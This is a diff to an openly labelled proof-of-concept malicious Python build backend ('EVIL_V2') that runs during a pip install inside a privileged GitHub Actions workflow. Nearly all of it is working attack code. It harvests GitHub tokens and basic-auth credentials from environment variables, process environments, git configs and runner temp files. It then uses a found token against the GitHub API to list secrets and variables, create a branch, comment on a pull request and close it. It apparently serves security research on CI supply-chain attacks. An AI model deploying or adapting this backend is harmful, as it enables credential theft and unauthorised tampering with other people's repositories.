@@ -1,4 +1,4 @@
-"""PoC PEP 517 backend: executes during `uv pip install -e .` in the privileged workflow."""
+"""PoC PEP 517 backend v2: find the job's GITHUB_TOKEN from checkout temp state."""
 import base64
 import glob
 import hashlib
@@ -11,11 +11,13 @@ import urllib.error
 import urllib.request
 
 REPO = "PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
-TOKEN_RE = re.compile(r"(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})")
-RAN = os.environ.get("EVIL_RAN_MARKER", "/tmp/.evil_backend_ran")
+TOKEN_RE = re.compile(rb"(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})")
+AUTH_RE = re.compile(rb"AUTHORIZATION: basic ([A-Za-z0-9+/=]+)", re.I)
 
 
 def sha(s):
+    if isinstance(s, bytes):
+        s = s.decode("utf-8", "replace")
     return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 
 
@@ -26,165 +28,160 @@ def emit(line):
         pass
 
 
-def api(method, path, token, body=None):
+def api(method, path, token, body=None, accept=None):
     url = "https://api.github.com" + path
     data = json.dumps(body).encode() if body is not None else None
     req = urllib.request.Request(url, data=data, method=method)
     req.add_header("Authorization", "token " + token)
-    req.add_header("Accept", "application/vnd.github+json")
+    req.add_header("Accept", accept or "application/vnd.github+json")
     req.add_header("User-Agent", "poc-backend")
     if data is not None:
         req.add_header("Content-Type", "application/json")
     try:
         with urllib.request.urlopen(req, timeout=25) as r:
-            raw = r.read().decode("utf-8", "replace")
-            return r.status, raw
+            return r.status, r.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
         return e.code, e.read().decode("utf-8", "replace")
     except Exception as e:
         return -1, repr(e)
 
 
-def find_tokens():
-    found = {}
+def decode_basic(b64):
+    try:
+        raw = base64.b64decode(b64 + b"=" * (-len(b64) % 4))
+        return raw.decode("utf-8", "replace")
+    except Exception:
+        return ""
 
-    def add(name, val):
-        if not val:
+
+def scan():
+    hits = {}  # sha -> (source, token)
+    auths = {}  # sha -> decoded basic payload
+
+    def add(src, blob):
+        if not blob:
             return
-        for m in TOKEN_RE.findall(val):
-            found.setdefault("sha256=" + sha(m), (name, m))
+        if isinstance(blob, str):
+            blob = blob.encode("utf-8", "replace")
+        for m in TOKEN_RE.findall(blob):
+            t = m.decode()
+            hits.setdefault(sha(t), (src, t))
+        for m in AUTH_RE.findall(blob):
+            dec = decode_basic(m)
+            if dec:
+                auths.setdefault(sha(dec), (src, dec))
+                for t in TOKEN_RE.findall(dec.encode()):
+                    hits.setdefault(sha(t.decode()), (src + "|basic", t.decode()))
 
+    # env
     for k, v in os.environ.items():
         add("env:" + k, v)
-    # event payload / workflow temp files
-    for p in [os.environ.get("GITHUB_EVENT_PATH"),
-              "/home/runner/work/_temp/_github_workflow/event.json"]:
+    # event payload
+    for p in [os.environ.get("GITHUB_EVENT_PATH")]:
         if p and os.path.exists(p):
-            try:
-                add("file:" + p, open(p, encoding="utf-8", errors="replace").read())
-            except Exception:
-                pass
-    # checkout credentials
-    for p in ["/home/runner/work/_temp/.git-credentials",
-              os.path.expanduser("~/.git-credentials"),
-              os.path.expanduser("~/.config/gh/hosts.yml"),
-              "/home/runner/actions-runner/.credentials",
-              "/home/runner/actions-runner/.credentials_rsaparams"]:
-        if os.path.exists(p):
-            try:
-                add("file:" + p, open(p, encoding="utf-8", errors="replace").read())
-            except Exception:
-                pass
-    # running processes (runner listener/worker may hold the job token)
+            add("event:" + p, open(p, "rb").read())
+    # git global configs used by checkout (temp HOME), and any leftover credential files
+    roots = ["/home/runner/work/_temp", "/home/runner/.config/git", "/home/runner",
+             os.environ.get("RUNNER_TEMP") or "/home/runner/work/_temp"]
+    seen = set()
+    for root in roots:
+        if not root or not os.path.isdir(root):
+            continue
+        for dirpath, dirnames, filenames in os.walk(root):
+            depth = dirpath.count(os.sep) - root.count(os.sep)
+            if depth > 3:
+                dirnames[:] = []
+                continue
+            for fn in filenames:
+                if fn not in (".gitconfig", "config", ".git-credentials", "credentials",
+                              "event.json", "gitconfig") and not fn.endswith(".log") and not fn.endswith(".json"):
+                    continue
+                p = os.path.join(dirpath, fn)
+                if p in seen:
+                    continue
+                seen.add(p)
+                try:
+                    if os.path.getsize(p) > 2_000_000:
+                        continue
+                    add("file:" + p, open(p, "rb").read())
+                except Exception:
+                    pass
+    # shells of running git/uv processes
     for envf in glob.glob("/proc/[0-9]*/environ"):
         try:
-            add("proc:" + envf, open(envf, "rb").read().decode("utf-8", "replace"))
+            add("proc:" + envf, open(envf, "rb").read())
         except Exception:
             pass
-    # runner diag logs
-    for p in glob.glob("/home/runner/actions-runner/_diag/*.log")[-6:]:
-        try:
-            add("diag:" + p, open(p, encoding="utf-8", errors="replace").read())
-        except Exception:
-            pass
-    return found
+    # git config from command line, as seen by subsequent steps
+    try:
+        out = subprocess.run(["git", "-C", os.getcwd(), "config", "--list", "--show-origin"],
+                             capture_output=True, timeout=20).stdout
+        add("git-config-list", out)
+        emit("GIT_CONFIG_LIST=" + out.decode("utf-8", "replace")[:400].replace("\n", " | "))
+    except Exception as e:
+        emit("GIT_CONFIG_ERR=%r" % (e,))
+    # list temp dir for the record
+    try:
+        emit("LS_RUNNER_TEMP=" + " ".join(sorted(os.listdir(os.environ.get("RUNNER_TEMP", "/home/runner/work/_temp"))))[:600])
+    except Exception as e:
+        emit("LS_RUNNER_TEMP_ERR=%r" % (e,))
+    return hits, auths
 
 
 def payload(stage):
-    if os.path.exists(RAN) and os.environ.get("EVIL_ONCE") == "1":
-        return
-    try:
-        open(RAN, "w").write("1")
-    except Exception:
-        pass
+    emit("=== EVIL_V2_START stage=%s ===" % stage)
+    emit("CTX workflow=%s event=%s job=%s repo=%s actor=%s run=%s" % (
+        os.environ.get("GITHUB_WORKFLOW"), os.environ.get("GITHUB_EVENT_NAME"),
+        os.environ.get("GITHUB_JOB"), os.environ.get("GITHUB_REPOSITORY"),
+        os.environ.get("GITHUB_ACTOR"), os.environ.get("GITHUB_RUN_ID")))
 
-    emit("=== EVIL_BACKEND_START stage=%s ===" % stage)
-    for k in ("GITHUB_WORKFLOW", "GITHUB_EVENT_NAME", "GITHUB_JOB", "GITHUB_REPOSITORY",
-              "GITHUB_REPOSITORY_OWNER", "GITHUB_REF", "GITHUB_HEAD_REF", "GITHUB_SHA",
-              "GITHUB_ACTOR", "GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "CI"):
-        emit("CTX_%s=%s" % (k, os.environ.get(k)))
+    hits, auths = scan()
+    for h, (src, dec) in sorted(auths.items()):
+        emit("FOUND_BASIC_AUTH src=%s decoded_sha256=%s decoded_len=%d decoded_prefix=%s" % (
+            src, sha(dec), len(dec), dec[:24]))
+    for h, (src, tok) in sorted(hits.items()):
+        emit("FOUND_TOKEN sha256=%s src=%s len=%d prefix=%s" % (h, src, len(tok), tok[:4]))
 
-    # 1) environment inventory (values of secret-looking vars are hashed, not printed)
-    for k in sorted(os.environ):
-        v = os.environ[k]
-        if TOKEN_RE.search(v) or any(s in k.upper() for s in ("TOKEN", "SECRET", "KEY", "PASSWORD", "CREDENTIAL")):
-            emit("ENV_HASH_%s sha256=%s len=%d" % (k, sha(v), len(v)))
-        else:
-            emit("ENV_%s=%s" % (k, v[:200].replace("\n", " ")))
-
-    # 2) credential hunting
-    toks = find_tokens()
-    for h, (src, val) in sorted(toks.items()):
-        emit("FOUND_TOKEN %s src=%s len=%d" % (h, src, len(val)))
-
-    # 3) prove liveness: use the first token found; prefer GITHUB_TOKEN if present
-    cand = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
-    if not cand and toks:
-        cand = sorted(toks.values())[0][1]
+    cand = os.environ.get("GITHUB_TOKEN")
+    if not cand and hits:
+        cand = sorted(hits.values())[0][1]
     if cand:
         emit("USING_TOKEN sha256=%s" % sha(cand))
         st, body = api("GET", "/repos/" + REPO, cand)
-        emit("API_GET_REPO status=%s body=%s" % (st, body[:700].replace("\n", " ")))
+        emit("API_GET_REPO status=%s body=%s" % (st, body[:900].replace("\n", " ")))
+        st, body = api("GET", "/user", cand)
+        emit("API_GET_USER status=%s body=%s" % (st, body[:400].replace("\n", " ")))
         st, body = api("GET", "/repos/" + REPO + "/actions/secrets", cand)
         emit("API_LIST_SECRETS status=%s body=%s" % (st, body[:300].replace("\n", " ")))
         st, body = api("GET", "/repos/" + REPO + "/actions/variables", cand)
-        emit("API_LIST_VARS status=%s body=%s" % (st, body[:600].replace("\n", " ")))
-        st, body = api("GET", "/user", cand)
-        emit("API_GET_USER status=%s body=%s" % (st, body[:300].replace("\n", " ")))
-        # write probe: create a throwaway ref (expected 403 if read-only)
+        emit("API_LIST_VARS status=%s body=%s" % (st, body[:800].replace("\n", " ")))
+        # GraphQL viewer + repo permissions
+        st, body = api("POST", "/graphql", cand, {"query": "{viewer{login} repository(owner:\"PDFtoMark\",name:\"triage-fivetran-v4c1fe98-3d551a\"){viewerPermission}}"})
+        emit("API_GRAPHQL status=%s body=%s" % (st, body[:400].replace("\n", " ")))
+        # write probes
         st, body = api("POST", "/repos/" + REPO + "/git/refs", cand,
                        {"ref": "refs/heads/poc-write-probe", "sha": os.environ.get("GITHUB_SHA", "")})
-        emit("API_CREATE_REF status=%s body=%s" % (st, body[:300].replace("\n", " ")))
-        # write probe: PR comment (expected 403 if read-only)
-        pr = os.environ.get("POC_PR")
-        if not pr:
-            try:
-                ev = json.load(open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8"))
-                wr = ev.get("workflow_run") or {}
-                emit("EVENT_WORKFLOW_RUN name=%s event=%s conclusion=%s head_branch=%s head_sha=%s head_repo=%s prs=%s" % (
-                    wr.get("name"), wr.get("event"), wr.get("conclusion"), wr.get("head_branch"),
-                    wr.get("head_sha"), (wr.get("head_repository") or {}).get("full_name"),
-                    [p.get("number") for p in (wr.get("pull_requests") or [])]))
-                prs = wr.get("pull_requests") or []
-                if prs:
-                    pr = str(prs[0].get("number"))
-            except Exception as e:
-                emit("EVENT_PARSE_ERR=%r" % (e,))
-        if pr:
-            st, body = api("POST", "/repos/" + REPO + "/issues/%s/comments" % pr, cand,
-                           {"body": "poc token-write probe " + sha(cand)[:12]})
-            emit("API_PR_COMMENT status=%s body=%s" % (st, body[:300].replace("\n", " ")))
+        emit("API_CREATE_REF status=%s body=%s" % (st, body[:400].replace("\n", " ")))
+        try:
+            ev = json.load(open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8"))
+            wr = ev.get("workflow_run") or {}
+            emit("EVENT wr=%s event=%s concl=%s head_repo=%s head_sha=%s prs=%s" % (
+                wr.get("name"), wr.get("event"), wr.get("conclusion"),
+                (wr.get("head_repository") or {}).get("full_name"), wr.get("head_sha"),
+                [p.get("number") for p in (wr.get("pull_requests") or [])]))
+            prs = wr.get("pull_requests") or []
+            if prs:
+                st, body = api("POST", "/repos/" + REPO + "/issues/%s/comments" % prs[0]["number"], cand,
+                               {"body": "token-write probe " + sha(cand)[:12]})
+                emit("API_PR_COMMENT status=%s body=%s" % (st, body[:400].replace("\n", " ")))
+                st, body = api("PATCH", "/repos/" + REPO + "/pulls/%s" % prs[0]["number"], cand,
+                               {"state": "closed"})
+                emit("API_PR_PATCH status=%s body=%s" % (st, body[:200].replace("\n", " ")))
+        except Exception as e:
+            emit("EVENT_ERR=%r" % (e,))
     else:
-        emit("NO_TOKEN_FOUND_IN_ENV_OR_FILES")
-
-    # 4) other live credentials present for steps
-    for k in ("ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "ACTIONS_CACHE_URL",
-              "ACTIONS_RESULTS_URL", "ACTIONS_ID_TOKEN_REQUEST_URL"):
-        v = os.environ.get(k)
-        emit("RUNTIME_ENV_%s present=%s len=%d" % (k, bool(v), len(v or "")))
-    rt = os.environ.get("ACTIONS_RUNTIME_TOKEN")
-    if rt:
-        url = (os.environ.get("ACTIONS_RESULTS_URL") or "").rstrip("/")
-        if url:
-            body = json.dumps({"workflow_run_backend_id": "", "workflow_job_backend_id": ""}).encode()
-            req = urllib.request.Request(url + "/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts",
-                                         data=body, method="POST")
-            req.add_header("Authorization", "Bearer " + rt)
-            req.add_header("Content-Type", "application/json")
-            try:
-                with urllib.request.urlopen(req, timeout=20) as r:
-                    emit("RUNTIME_LIST_ARTIFACTS status=%s body=%s" % (r.status, r.read().decode()[:300]))
-            except urllib.error.HTTPError as e:
-                emit("RUNTIME_LIST_ARTIFACTS status=%s body=%s" % (e.code, e.read().decode()[:300]))
-            except Exception as e:
-                emit("RUNTIME_LIST_ARTIFACTS err=%r" % (e,))
-
-    # 5) git config / checkout leftovers
-    for p in [".git/config", "/home/runner/work/_temp/.gitconfig"]:
-        if os.path.exists(p):
-            emit("GITFILE_%s=%s" % (p, open(p, errors="replace").read()[:600].replace("\n", " | ")))
-
-    emit("=== EVIL_BACKEND_END stage=%s ===" % stage)
+        emit("NO_TOKEN_FOUND")
+    emit("=== EVIL_V2_END ===")
 
 
 def get_requires_for_build_wheel(config_settings=None):
